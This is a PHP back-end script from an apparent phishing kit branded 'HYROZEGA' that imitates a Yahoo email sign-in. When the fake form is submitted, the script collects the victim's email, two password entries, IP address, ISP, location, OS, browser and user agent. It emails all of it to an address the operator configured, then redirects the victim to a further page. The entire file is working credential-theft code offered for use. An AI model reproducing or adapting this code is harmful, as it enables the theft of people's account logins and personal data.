<?php
session_start();

error_reporting(0);
session_start();
require_once '../../../main.php';

if(isset($_POST['submit'])) {
    $_POST['email'];
    $mail = $_SESSION['email'];
    $pw= $_POST['submit'];
    $pw2= $_POST['password2'];
    $message = "#---------------------[ HYROZEGA ]-------------------------#
                #---------------------[ EMAIL LOGIN ]-------------------------#
                Email           : ".$mail."
                Password        : ".$pw."
                Password 2      : ".$pw2."
                #-------------------[ DEVICE INFORMATION ]--------------------#
                IP Address  : ".$ip."
                ISP		    : ".$ispuser."
                Region		: ".$regioncity."
                City		: ".$citykota."
                GMT         : ".$continent."
                Timezone	: ".$timezone."
                OS/Browser	: ".$os." / ".$br."
                Date		: ".$date."
                User Agent	: ".$user_agent."
                #----------------[ きみ の こと が すき だから ]----------------#";
    $from = $setting['sender_mail'];
    $to = $setting['email_result'];
    $headers = "From: HYROES <".$from.">";
    $subject = "[HYROZEGA] - YAHOO EMAIL [$cn - $os - $ip]";
    mail($to, $subject, $message, $headers);
    
    
    echo "<script type='text/javascript'>window.top.location='../../../CruiseID/';</script>";
    }
?>